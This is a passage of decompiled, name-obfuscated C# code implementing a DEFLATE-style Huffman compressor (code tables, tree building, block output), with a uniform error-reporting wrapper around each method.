            int num11;
            int num12;
            if (true)
            {
              int num13 = 7;
              if (num13 != 0)
              {
                int num14 = num9 & num13;
                num4 = num8 + num14;
                goto label_16;
              }
              else
              {
                num12 = num13;
                num11 = num9;
                num10 = num8;
                goto label_18;
              }
            }
            else
            {
              num11 = num9;
              num10 = num8;
              goto label_17;
            }
label_15:
            num4 = num5 - num6;
label_16:
            num10 = num4;
            num11 = 0;
label_17:
            num12 = 0;
label_18:
            if (num12 != 0)
            {
              num6 = num11;
              num5 = num10;
              goto label_15;
            }
            else if (num10 > num11)
            {
              this.\u0001.\u0002(2, 10);
              int num15 = num4;
              num6 = 10;
              num5 = num15;
              goto label_15;
            }
            else
              this.\u0001 = 16;
          }
label_8:
          return num3 - length;
label_23:
          return num3 - length;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) length;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) num4;
          byte[] numArray = obj0;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) this, (object) numArray);
          throw;
        }
      }
    }

    internal sealed class \u0007
    {
      private static readonly int[] \u0001;
      private static readonly byte[] \u0001;
      private \u0004.\u000E \u0001;
      private \u0004.\u0007.\u0001 \u0001;
      private \u0004.\u0007.\u0001 \u0002;
      private \u0004.\u0007.\u0001 \u0003;
      private short[] \u0001;
      private byte[] \u0002;
      private int \u0001;
      private int \u0002;
      private static readonly short[] \u0002;
      private static readonly byte[] \u0003;
      private static readonly short[] \u0003;
      private static readonly byte[] \u0004;

      public static short \u0002([In] int obj0)
      {
        try
        {
          return (short) ((int) \u0004.\u0007.\u0001[obj0 & 15] << 12 | (int) \u0004.\u0007.\u0001[obj0 >> 4 & 15] << 8 | (int) \u0004.\u0007.\u0001[obj0 >> 8 & 15] << 4 | (int) \u0004.\u0007.\u0001[obj0 >> 12]);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) obj0;
          \u0005.\u0002(ex, (object) local);
          throw;
        }
      }

      static \u0007()
      {
label_0:
        int index;
        try
        {
          \u0004.\u0007.\u0001 = new int[19]
          {
            16,
            17,
            18,
            0,
            8,
            7,
            9,
            6,
            10,
            5,
            11,
            4,
            12,
            3,
            13,
            2,
            14,
            1,
            15
          };
          int length1;
          if (true)
          {
            \u0004.\u0007.\u0001 = new byte[16]
            {
              (byte) 0,
              (byte) 8,
              (byte) 4,
              (byte) 12,
              (byte) 2,
              (byte) 10,
              (byte) 6,
              (byte) 14,
              (byte) 1,
              (byte) 9,
              (byte) 5,
              (byte) 13,
              (byte) 3,
              (byte) 11,
              (byte) 7,
              (byte) 15
            };
            \u0004.\u0007.\u0002 = new short[286];
            \u0004.\u0007.\u0003 = new byte[286];
            if (true)
            {
              length1 = 0;
              goto label_23;
            }
          }
          else
            goto label_14;
label_6:
          int num1;
          while (true)
          {
            num1 = index;
            if (true)
            {
              if (num1 < 256)
              {
                \u0004.\u0007.\u0002[index] = \u0004.\u0007.\u0002(256 + index << 7);
                \u0004.\u0007.\u0003[index++] = (byte) 9;
              }
              else
                break;
            }
            else
              goto label_12;
          }
label_11:
          num1 = index;
label_12:
          if (num1 < 280)
          {
            \u0004.\u0007.\u0002[index] = \u0004.\u0007.\u0002(index - 256 << 9);
            if (true)
            {
              \u0004.\u0007.\u0003[index++] = (byte) 7;
              goto label_11;
            }
            else
              goto label_0;
          }
label_14:
          for (; index < 286; \u0004.\u0007.\u0003[index++] = (byte) 8)
            \u0004.\u0007.\u0002[index] = \u0004.\u0007.\u0002(index - 88 << 8);
          int length2 = 30;
label_16:
          if (length2 != 0)
          {
            \u0004.\u0007.\u0003 = new short[length2];
            length1 = 30;
            if (length1 != 0)
            {
              \u0004.\u0007.\u0004 = new byte[length1];
              index = 0;
            }
            else
              goto label_23;
          }
          else
            goto label_21;
label_20:
          length2 = index;
label_21:
          if (length2 >= 30)
            return;
          \u0004.\u0007.\u0003[index] = \u0004.\u0007.\u0002(index << 11);
          \u0004.\u0007.\u0004[index] = (byte) 5;
          ++index;
          goto label_20;
label_23:
          index = length1;
          int num2;
          int num3;
          while (true)
          {
            num2 = index;
            num3 = 144;
            if (num3 != 0)
            {
              if (num2 < num3)
              {
                \u0004.\u0007.\u0002[index] = \u0004.\u0007.\u0002(48 + index << 8);
                \u0004.\u0007.\u0003[index++] = (byte) 8;
              }
              else
                goto label_6;
            }
            else
              break;
          }
          length2 = num3;
          length2 = num2;
          goto label_16;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local = (ValueType) index;
          \u0005.\u0002(ex, (object) local);
          throw;
        }
      }

      public \u0007([In] \u0004.\u000E obj0)
      {
        try
        {
          this.\u0001 = obj0;
          this.\u0001 = new \u0004.\u0007.\u0001(this, 286, 257, 15);
          this.\u0002 = new \u0004.\u0007.\u0001(this, 30, 1, 15);
          this.\u0003 = new \u0004.\u0007.\u0001(this, 19, 4, 7);
          this.\u0001 = new short[16384];
          this.\u0002 = new byte[16384];
        }
        catch (Exception ex)
        {
          \u0004.\u000E obj = obj0;
          \u0005.\u0002(ex, (object) this, (object) obj);
          throw;
        }
      }

      public void \u0002()
      {
        try
        {
          this.\u0001 = 0;
          this.\u0002 = 0;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      private int \u0002([In] int obj0)
      {
        int num1;
        try
        {
          if (obj0 == (int) byte.MaxValue)
            return 285;
          int num2 = 257;
          if (num2 != 0)
            goto label_8;
label_4:
          if (true)
          {
            obj0 = num2;
            goto label_12;
          }
          else
            goto label_14;
label_8:
          num1 = num2;
label_12:
          int num3;
          do
          {
            num3 = obj0;
            if (true)
            {
              if (num3 >= 8)
                goto label_9;
            }
            else
              goto label_3;
          }
          while (false);
          goto label_13;
label_3:
          num2 = num3 >> 1;
          goto label_4;
label_9:
          int num4 = num1 + 4;
          if (true)
            num1 = num4;
          num3 = obj0;
          goto label_3;
label_13:
          num2 = num1;
label_14:
          return num2 + obj0;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0005.\u0002(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      private int \u0003([In] int obj0)
      {
        int num1;
        try
        {
          do
          {
            num1 = 0;
          }
          while (false);
          int num2;
          while (true)
          {
            if (obj0 >= 4)
              goto label_8;
            else
              goto label_12;
label_5:
            int num3;
            obj0 = num3;
            continue;
label_8:
            int num4 = num1;
            int num5 = 2;
            if (num5 != 0)
            {
              if (num5 != 0)
              {
                int num6 = num4 + 2;
                if (true)
                  num1 = num6;
                int num7 = obj0;
                num5 = 1;
                num4 = num7;
              }
              else
              {
                num3 = num4;
                goto label_5;
              }
            }
            num3 = num4 >> num5;
            goto label_5;
label_12:
            num2 = num1 + obj0;
            if (false)
            {
              num3 = num2;
              goto label_5;
            }
            else
              break;
          }
          return num2;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0005.\u0002(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      public void \u0002([In] int obj0)
      {
        int index;
        try
        {
          this.\u0003.\u0002();
          this.\u0001.\u0002();
          this.\u0002.\u0002();
          this.\u0001.\u0002(this.\u0001.\u0002 - 257, 5);
          this.\u0001.\u0002(this.\u0002.\u0002 - 1, 5);
          this.\u0001.\u0002(obj0 - 4, 4);
          for (index = 0; index < obj0; ++index)
            this.\u0001.\u0002((int) this.\u0003.\u0001[\u0004.\u0007.\u0001[index]], 3);
          this.\u0001.\u0003(this.\u0003);
          this.\u0002.\u0003(this.\u0003);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) index;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj0;
          \u0005.\u0002(ex, (object) local1, (object) this, (object) local2);
          throw;
        }
      }

      public void \u0003()
      {
        int num1;
        int num2;
        int num3;
        int num4;
        int num5;
        int index1;
        try
        {
          int num6 = 0;
          if (num6 != 0)
            goto label_12;
          else
            goto label_22;
label_6:
          if (num3 <= 5)
            this.\u0001.\u0002(num1 & (1 << num3) - 1, num3);
label_8:
          int num7 = this.\u0003(num4);
label_9:
          num5 = num7;
          do
          {
            this.\u0002.\u0002(num5);
          }
          while (false);
          num6 = num5 / 2 - 1;
label_12:
          num3 = num6;
          num7 = num3;
          if (true)
          {
            if (num7 > 0)
              this.\u0001.\u0002(num4 & (1 << num3) - 1, num3);
          }
          else
            goto label_9;
label_16:
          if (true)
            ++index1;
          else
            goto label_6;
label_18:
          int num8 = index1;
          while (true)
          {
            int num9 = this.\u0001;
label_20:
            if (num8 < num9)
            {
              int num10 = (int) this.\u0002[index1] & (int) byte.MaxValue;
              if (false)
              {
                num8 = num10;
              }
              else
              {
                num1 = num10;
                num4 = (int) this.\u0001[index1];
                int num11;
                for (int index2 = num4--; index2 != 0; index2 = num11)
                {
                  num2 = this.\u0002(num1);
                  this.\u0001.\u0002(num2);
                  num11 = num2 - 261;
                  if (true)
                  {
                    num3 = num11 / 4;
                    int num12 = num3;
                    int num13 = 0;
                    if (num13 == 0)
                    {
                      if (num12 <= num13)
                        goto label_8;
                      else
                        goto label_6;
                    }
                    else
                    {
                      num9 = num13;
                      num8 = num12;
                      goto label_20;
                    }
                  }
                }
                break;
              }
            }
            else
              goto label_21;
          }
          this.\u0001.\u0002(num1);
          goto label_16;
label_21:
          this.\u0001.\u0002(256);
          return;
label_22:
          index1 = num6;
          goto label_18;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> local4 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> local6 = (ValueType) num5;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) local4, (object) local5, (object) local6, (object) this);
          throw;
        }
      }

      public void \u0002([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] bool obj3)
      {
        try
        {
          this.\u0001.\u0002(obj3 ? 1 : 0, 3);
          this.\u0001.\u0002();
          this.\u0001.\u0002(obj2);
          this.\u0001.\u0002(~obj2);
          this.\u0001.\u0002(obj0, obj1, obj2);
          this.\u0002();
        }
        catch (Exception ex)
        {
          byte[] numArray = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) obj2;
          // ISSUE: variable of a boxed type
          __Boxed<bool> local3 = (ValueType) obj3;
          \u0005.\u0002(ex, (object) this, (object) numArray, (object) local1, (object) local2, (object) local3);
          throw;
        }
      }

      public void \u0003([In] byte[] obj0, [In] int obj1, [In] int obj2, [In] bool obj3)
      {
        int num1;
        int index1;
        int num2;
        int num3;
        int index2;
        int index3;
        short[] numArray;
        try
        {
          (numArray = this.\u0001.\u0001)[256] = (short) ((int) numArray[256] + 1);
          if (true)
            goto label_31;
label_10:
          int num4;
          int num5;
          int num6;
          while (true)
          {
            int num7;
            int num8;
            if (index1 > num1)
            {
              num7 = (int) this.\u0003.\u0001[\u0004.\u0007.\u0001[index1]];
              num8 = 0;
            }
            else
              goto label_11;
label_5:
            if (num7 > num8)
            {
              if (true)
                num1 = index1 + 1;
              else
                break;
            }
            int num9 = index1;
            if (true)
            {
              index1 = num9 - 1;
              continue;
            }
            goto label_12;
label_11:
            num9 = 14 + num1 * 3 + this.\u0003.\u0002();
label_12:
            int num10 = this.\u0001.\u0002();
            num2 = num9 + num10 + this.\u0002.\u0002() + this.\u0002;
            num3 = this.\u0002;
            for (index2 = 0; index2 < 286; ++index2)
            {
              num4 = num3;
              num5 = (int) this.\u0001.\u0001[index2];
              if (true)
              {
                int num11 = (int) \u0004.\u0007.\u0003[index2];
                int num12 = num5 * num11;
                num3 = num4 + num12;
              }
              else
                goto label_26;
            }
            index3 = 0;
            int num13;
            int num14;
            while (true)
            {
              int num15;
              if (index3 < 30)
              {
                num13 = num3;
                num14 = (int) this.\u0002.\u0001[index3] * (int) \u0004.\u0007.\u0004[index3];
                if (true)
                {
                  num3 = num13 + num14;
                  num15 = index3;
                }
                else
                  break;
              }
              else
                goto label_21;
label_19:
              index3 = num15 + 1;
              continue;
label_21:
              if (num2 >= num3)
                num2 = num3;
              if (obj1 >= 0)
              {
                num6 = obj2;
                if (false)
                {
                  num15 = num6;
                  goto label_19;
                }
                else
                  goto label_25;
              }
              else
                goto label_28;
            }
            num8 = num14;
            num7 = num13;
            goto label_5;
          }
          return;
label_25:
          int num16 = num6 + 4;
          num5 = num2 >> 3;
          num4 = num16;
label_26:
          if (num4 < num5)
          {
            this.\u0002(obj0, obj1, obj2, obj3);
            return;
          }
label_28:
          if (num2 == num3)
          {
            this.\u0001.\u0002(2 + (obj3 ? 1 : 0), 3);
            this.\u0001.\u0002(\u0004.\u0007.\u0002, \u0004.\u0007.\u0003);
            this.\u0002.\u0002(\u0004.\u0007.\u0003, \u0004.\u0007.\u0004);
            this.\u0003();
            this.\u0002();
            return;
          }
          this.\u0001.\u0002(4 + (obj3 ? 1 : 0), 3);
          this.\u0002(num1);
          this.\u0003();
          this.\u0002();
          return;
label_31:
          this.\u0001.\u0003();
          this.\u0002.\u0003();
          this.\u0001.\u0002(this.\u0003);
          this.\u0002.\u0002(this.\u0003);
          this.\u0003.\u0003();
          num1 = 4;
          if (false)
            return;
          index1 = 18;
          goto label_10;
        }
        catch (Exception ex)
        {
          object[] objArray = new object[12]
          {
            (object) num1,
            (object) index1,
            (object) num2,
            (object) num3,
            (object) index2,
            (object) index3,
            (object) numArray,
            (object) this,
            (object) obj0,
            (object) obj1,
            (object) obj2,
            (object) obj3
          };
          \u0005.\u0002(ex, objArray);
          throw;
        }
      }

      public bool \u0002()
      {
        try
        {
          return this.\u0001 >= 16384;
        }
        catch (Exception ex)
        {
          \u0005.\u0002(ex, (object) this);
          throw;
        }
      }

      public bool \u0002([In] int obj0)
      {
        short[] numArray1;
        int num1;
        int index1;
        try
        {
          this.\u0001[this.\u0001] = (short) 0;
          byte[] numArray2 = this.\u0002;
          \u0004.\u0007 obj = this;
          int num2;
          num1 = num2 = obj.\u0001;
          obj.\u0001 = num2 + 1;
          int index2 = num1;
          int num3 = (int) (byte) obj0;
          numArray2[index2] = (byte) num3;
          (numArray1 = this.\u0001.\u0001)[index1 = obj0] = (short) ((int) numArray1[(IntPtr) index1] + 1);
          return this.\u0002();
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          short[] numArray3 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<IntPtr> local2 = (ValueType) (IntPtr) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) obj0;
          \u0005.\u0002(ex, (object) local1, (object) numArray3, (object) local2, (object) this, (object) local3);
          throw;
        }
      }

      public bool \u0002([In] int obj0, [In] int obj1)
      {
        int num1;
        short[] numArray1;
        IntPtr index1;
        int num2;
        int num3;
        try
        {
          this.\u0001[this.\u0001] = (short) obj0;
          byte[] numArray2 = this.\u0002;
          \u0004.\u0007 obj = this;
          int num4;
          num3 = num4 = obj.\u0001;
          obj.\u0001 = num4 + 1;
          int index2 = num3;
          int num5 = (int) (byte) (obj1 - 3);
          numArray2[index2] = (byte) num5;
          num1 = this.\u0002(obj1 - 3);
          (numArray1 = this.\u0001.\u0001)[(int) (index1 = (IntPtr) num1)] = (short) ((int) numArray1[index1] + 1);
          if (num1 >= 265 && num1 < 285)
            this.\u0002 += (num1 - 261) / 4;
          num2 = this.\u0003(obj0 - 1);
          (numArray1 = this.\u0002.\u0001)[(int) (index1 = (IntPtr) num2)] = (short) ((int) numArray1[index1] + 1);
          if (num2 >= 4)
            this.\u0002 += num2 / 2 - 1;
          return this.\u0002();
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> local1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local2 = (ValueType) num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> local3 = (ValueType) num3;
          short[] numArray3 = numArray1;
          // ISSUE: variable of a boxed type
          __Boxed<IntPtr> local4 = (ValueType) index1;
          // ISSUE: variable of a boxed type
          __Boxed<int> local5 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> local6 = (ValueType) obj1;
          \u0005.\u0002(ex, (object) local1, (object) local2, (object) local3, (object) numArray3, (object) local4, (object) this, (object) local5, (object) local6);
          throw;
        }
      }

      public sealed class \u0001
      {
        public short[] \u0001;
        public byte[] \u0001;
        public int \u0001;
        public int \u0002;
        private short[] \u0002;
        private int[] \u0001;
        private int \u0003;
        private \u0004.\u0007 \u0001;

        public \u0001([In] \u0004.\u0007 obj0, [In] int obj1, [In] int obj2, [In] int obj3)
        {
          try
          {
            this.\u0001 = obj0;
            this.\u0001 = obj2;
            this.\u0003 = obj3;
            this.\u0001 = new short[(int) checked ((uint) obj1)];
            this.\u0001 = new int[(int) checked ((uint) obj3)];
          }
          catch (Exception ex)
          {
            \u0004.\u0007 obj = obj0;
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) obj1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) obj2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) obj3;
            \u0005.\u0002(ex, (object) this, (object) obj, (object) local1, (object) local2, (object) local3);
            throw;
          }
        }

        public void \u0002([In] int obj0)
        {
          try
          {
            this.\u0001.\u0001.\u0002((int) this.\u0002[obj0] & (int) ushort.MaxValue, (int) this.\u0001[obj0]);
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> local = (ValueType) obj0;
            \u0005.\u0002(ex, (object) this, (object) local);
            throw;
          }
        }

        public void \u0002([In] short[] obj0, [In] byte[] obj1)
        {
          try
          {
            this.\u0002 = obj0;
            this.\u0001 = obj1;
          }
          catch (Exception ex)
          {
            short[] numArray1 = obj0;
            byte[] numArray2 = obj1;
            \u0005.\u0002(ex, (object) this, (object) numArray1, (object) numArray2);
            throw;
          }
        }

        public void \u0002()
        {
          int num1;
          int index1;
          int index2;
          int num2;
          int[] numArray1;
          int[] numArray2;
          IntPtr index3;
          try
          {
            if (false)
              goto label_8;
            else
              goto label_18;
label_4:
            int num3;
            index1 = num3;
label_5:
            int num4 = index1;
            int num5;
            int num6;
            while (true)
            {
              num5 = this.\u0003;
              if (true)
              {
                if (num4 < num5)
                {
                  numArray1[index1] = num1;
                  num1 += this.\u0001[index1] << 15 - index1;
                  num6 = index1;
                  if (false)
                    num4 = num6;
                  else
                    break;
                }
                else
                  goto label_8;
              }
              else
                goto label_22;
            }
            num3 = num6 + 1;
            goto label_4;
label_22:
            int num7 = num5;
            int num8 = num4;
            goto label_10;
label_8:
            index2 = 0;
            goto label_16;
label_10:
            if (num8 > num7)
            {
              if (true)
                this.\u0002[index2] = \u0004.\u0007.\u0002(numArray1[num2 - 1]);
              else
                goto label_19;
            }
            else
              goto label_14;
label_13:
            (numArray2 = numArray1)[(int) (index3 = (IntPtr) (num2 - 1))] = numArray2[index3] + (1 << 16 - num2);
label_14:
            num3 = index2;
            if (true)
              index2 = num3 + 1;
            else
              goto label_4;
label_16:
            if (index2 >= this.\u0002)
              return;
            num2 = (int) this.\u0001[index2];
            num8 = num2;
            num7 = 0;
            goto label_10;
label_18:
            int length = this.\u0001.Length;
label_19:
            numArray1 = new int[(int) checked ((uint) this.\u0003)];
            num1 = 0;
            this.\u0002 = new short[(int) checked ((uint) this.\u0001.Length)];
            if (true)
            {
              index1 = 0;
              goto label_5;
            }
            else
              goto label_13;
          }
          catch (Exception ex)
          {
            int[] numArray3 = numArray1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local1 = (ValueType) num1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local2 = (ValueType) index1;
            // ISSUE: variable of a boxed type
            __Boxed<int> local3 = (ValueType) index2;
            // ISSUE: variable of a boxed type
            __Boxed<int> local4 = (ValueType) num2;
            int[] numArray4 = numArray2;
            // ISSUE: variable of a boxed type
            __Boxed<IntPtr> local5 = (ValueType) index3;
            \u0005.\u0002(ex, (object) numArray3, (object) local1, (object) local2, (object) local3, (object) local4, (object) numArray4, (object) local5, (object) this);
            throw;
          }
        }

        private void \u0002([In] int[] obj0)
        {
          int index1;
          int length;
          int[] numArray1;
          int index2;
          int num1;
          int num2;
          int num3;
          int num4;
          int[] numArray2;
          IntPtr index3;
          int num5;
          int num6;
          int num7;
          int num8;
          int num9;
          int index4;
          try
          {
            this.\u0001 = new byte[(int) checked ((uint) this.\u0001.Length)];
            length = obj0.Length / 2;
            num6 = (length + 1) / 2;
            num2 = 0;
            index1 = 0;
            int num10;
            int num11;
            int num12;
            int num13;
            while (true)
            {
              num10 = index1;
              num11 = this.\u0003;
              if (true)
              {
                if (num10 < num11)
                {
                  this.\u0001[index1] = 0;
                  if (true)
                  {
                    num12 = index1;
                    num13 = 1;
                    if (num13 != 0)
                      index1 = num12 + num13;
                    else
                      goto label_43;
                  }
                  else
                    goto label_12;
                }
                else
                  break;
              }
              else
                goto label_28;
            }
            numArray1 = new int[(int) checked ((uint) length)];
            numArray1[length - 1] = 0;
            int num14 = length;
label_6:
            int num15 = num14 - 1;
            int num16;
            if (true)
            {
              index2 = num15;
              goto label_17;
            }
            else
            {
              num16 = num15;
              goto label_27;
            }
label_10:
            int num17;
            int num18;
            if (num17 > num18)
              num1 = this.\u0003;
            else
              goto label_13;
label_12:
            ++num2;
label_13:
            int[] numArray3 = numArray1;
            int index5 = obj0[2 * index2];
            numArray1[obj0[2 * index2 + 1]] = num3 = num1;
            int num19 = num3;
            numArray3[index5] = num19;
label_15:
            int num20 = index2;
            if (true)
              index2 = num20 - 1;
            else
              goto label_24;
label_17:
            if (index2 >= 0)
            {
              if (obj0[2 * index2 + 1] != -1)
              {
                num1 = numArray1[index2] + 1;
                int num21 = num1;
                num18 = this.\u0003;
                num17 = num21;
                goto label_10;
              }
              else
              {
                num4 = numArray1[index2];
                (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) (num4 - 1))] = numArray2[index3] + 1;
                this.\u0001[obj0[2 * index2]] = (byte) numArray1[index2];
                goto label_15;
              }
            }
            else
            {
              if (num2 == 0)
                return;
              num5 = this.\u0003 - 1;
              do
              {
                do
                  ;
                while (this.\u0001[--num5] == 0);
                do
                {
                  (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) num5)] = numArray2[index3] - 1;
                  int[] numArray4;
                  numArray2 = numArray4 = this.\u0001;
                  int index6;
                  num5 = index6 = num5 + 1;
                  index3 = (IntPtr) index6;
                  int num22 = numArray2[index3] + 1;
                  numArray4[index6] = num22;
                  num2 -= 1 << this.\u0003 - 1 - num5;
                }
                while (num2 > 0 && num5 < this.\u0003 - 1);
              }
              while (num2 > 0);
              (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) (this.\u0003 - 1))] = numArray2[index3] + num2;
              (numArray2 = this.\u0001)[(int) (index3 = (IntPtr) (this.\u0003 - 2))] = numArray2[index3] - num2;
              num20 = 2;
            }
label_24:
            int num23 = num6;
            num7 = num20 * num23;
            num8 = this.\u0003;
            goto label_37;
label_27:
            index4 = num16;
            int num24 = obj0[index4 + 1];
            num11 = -1;
            num10 = num24;
label_28:
            int num25;
            if (num10 == num11)
            {
              this.\u0001[obj0[index4]] = (byte) num8;
              num14 = num9;
              num25 = 4;
            }
            else
              goto label_34;
label_30:
            if (num25 != 0)
            {
              num18 = 1;
              num17 = num14;
              goto label_32;
            }
            else
              goto label_6;
label_43:
            num25 = num13;
            num14 = num12;
            goto label_30;
label_32:
            if (num18 != 0)
              num9 = num17 - num18;
            else
              goto label_10;
label_34:
            if (num9 > 0)
            {
              num16 = 2 * obj0[num7++];
              goto label_27;
            }
            else
            {
              num17 = num8;
              num18 = 1;
              if (num18 != 0)
                num8 = num17 - num18;
              else
                goto label_32;
            }
label_37:
            if (num8 == 0)
              return;
            num9 = this.\u0001[num8 - 1];
            goto label_34;
          }
          catch (Exception ex)
          {
            object[] objArray = new object[18]
            {
              (object) length,
              (object) num6,
              (object) num2,
              (object) index1,
              (object) numArray1,
              (object) index2,
              (object) num1,
              (object) num4,
              (object) num5,
              (object) num7,
              (object) num8,
              (object) num9,
              (object) index4,
              (object) num3,
              (object) numArray2,
              (object) index3,
              (object) this,
              (object) obj0
            };
            \u0005.\u0002(ex, objArray);
            throw;
          }
        }

        public void \u0003()
        {
          int num1;
          int num2;
          int index1;
          int[] numArray1;
          int index2;
          int index3;
          int num3;
          int length1;
          int num4;
          int num5;
          int[] numArray2;
          int[] numArray3;
          int num6;
          int index4;
          int index5;
          int index6;
          int index7;
          int index8;
          int index9;
          int num7;
          int index10;
          int num8;
          try
          {
            length1 = this.\u0001.Length;
            int length2 = (int) checked ((uint) length1);
            if (true)
            {
              numArray1 = new int[length2];
              num2 = 0;
              num3 = 0;
              index3 = 0;
            }
            else
              goto label_10;
label_7:
            int num9 = index3;
label_8:
            int num10 = length1;
            if (num9 < num10)
              goto label_47;
            else
              goto label_14;
label_10:
            int num11;
            if (length2 >= 2)
              num11 = 0;
            else
              num3 = num11 = num3 + 1;
            num4 = num11;
            numArray1[num2++] = num4;
label_14:
            if (num2 < 2)
            {
              length2 = num3;
              goto label_10;
            }
            else
            {
              this.\u0002 = Math.Max(num3 + 1, this.\u0001);
              num5 = num2;
              numArray2 = new int[(int) checked ((uint) unchecked (4 * num2 - 2))];
              numArray3 = new int[(int) checked ((uint) unchecked (2 * num2 - 1))];
              num6 = num5;
              for (index4 = 0; index4 < num2; ++index4)
              {
                index5 = numArray1[index4];
                numArray2[2 * index4] = index5;
                numArray2[2 * index4 + 1] = -1;
                numArray3[index4] = (int) this.\u0001[index5] << 8;
                numArray1[index4] = index4;
              }
label_18:
              index6 = numArray1[0];
              index7 = numArray1[--num2];
              index8 = 0;
              index9 = 1;
              int num12;
              int num13;
              while (true)
              {
                if (index9 < num2)
                {
                  if (index9 + 1 < num2 && numArray3[numArray1[index9]] > numArray3[numArray1[index9 + 1]])
                  {
                    int num14 = index9;
                    num12 = num13 = 1;
                    num12 = num14;
                  }
                  else
                    goto label_23;
                }
                else
                  goto label_26;
label_21:
                if (num13 != 0)
                  index9 = num12 + num12;
                else
                  goto label_33;
label_23:
                numArray1[index8] = numArray1[index9];
                index8 = index9;
                int num15 = index9 * 2 + 1;
                if (true)
                {
                  index9 = num15;
                  continue;
                }
                goto label_31;
label_26:
                num7 = numArray3[index7];
label_28:
                if ((index9 = index8) > 0)
                {
                  if (true)
                    num15 = numArray3[numArray1[index8 = (index9 - 1) / 2]];
                  else
                    goto label_47;
                }
                else
                  goto label_32;
label_31:
                int num16 = num7;
                if (num15 > num16)
                {
                  numArray1[index9] = numArray1[index8];
                  goto label_28;
                }
label_32:
                numArray1[index9] = index7;
                index10 = numArray1[0];
                num12 = num6;
label_33:
                num13 = 1;
                if (num13 == 0)
                  goto label_21;
                else
                  break;
              }
              num6 = num12 + num13;
              index7 = num12;
              numArray2[2 * index7] = index6;
              numArray2[2 * index7 + 1] = index10;
              num8 = Math.Min(numArray3[index6] & (int) byte.MaxValue, numArray3[index10] & (int) byte.MaxValue);
              numArray3[index7] = num7 = numArray3[index6] + numArray3[index10] - num8 + 1;
              index8 = 0;
              index9 = 1;
              while (true)
              {
                if (index9 < num2)
                {
                  if (index9 + 1 >= num2 || numArray3[numArray1[index9]] <= numArray3[numArray1[index9 + 1]])
                    goto label_37;
                }
                else
                  goto label_42;
label_36:
                ++index9;
label_37:
                numArray1[index8] = numArray1[index9];
                num9 = index9;
                int num17;
                if (true)
                {
                  index8 = num9;
                  num17 = index8 * 2 + 1;
                }
                else
                  goto label_8;
label_39:
                index9 = num17;
                continue;
label_42:
                while ((index9 = index8) > 0 && numArray3[numArray1[index8 = (index9 - 1) / 2]] > num7)
                  numArray1[index9] = numArray1[index8];
                numArray1[index9] = index7;
                int num18 = num2;
                if (false)
                {
                  num17 = num18;
                  goto label_39;
                }
                else if (num18 <= 1)
                {
                  if (false)
                    goto label_36;
                  else
                    break;
                }
                else
                  goto label_18;
              }
              this.\u0002(numArray2);
              return;
            }
label_47:
            num1 = (int) this.\u0001[index3];
            if (num1 != 0)
            {
              for (index1 = num2++; index1 > 0 && (int) this.\u0001[numArray1[index2 = (index1 - 1) / 2]] > num1; index1 = index2)
                numArray1[index1] = numArray1[index2];
              numArray1[index1] = index3;
              num3 = index3;
            }
            ++index3;
            goto label_7;
          }
          catch (Exception ex)
          {
            object[] objArray = new object[23]
            {
              (object) length1,
              (object) numArray1,
              (object) num2,
              (object) num3,
              (object) index3,
              (object) num1,
              (object) index1,
              (object) index2,
              (object) num4,
              (object) num5,
              (object) numArray2,
              (object) numArray3,
              (object) num6,
              (object) index4,
              (object) index5,
              (object) index6,
              (object) index7,
              (object) index8,
              (object) index9,
              (object) num7,
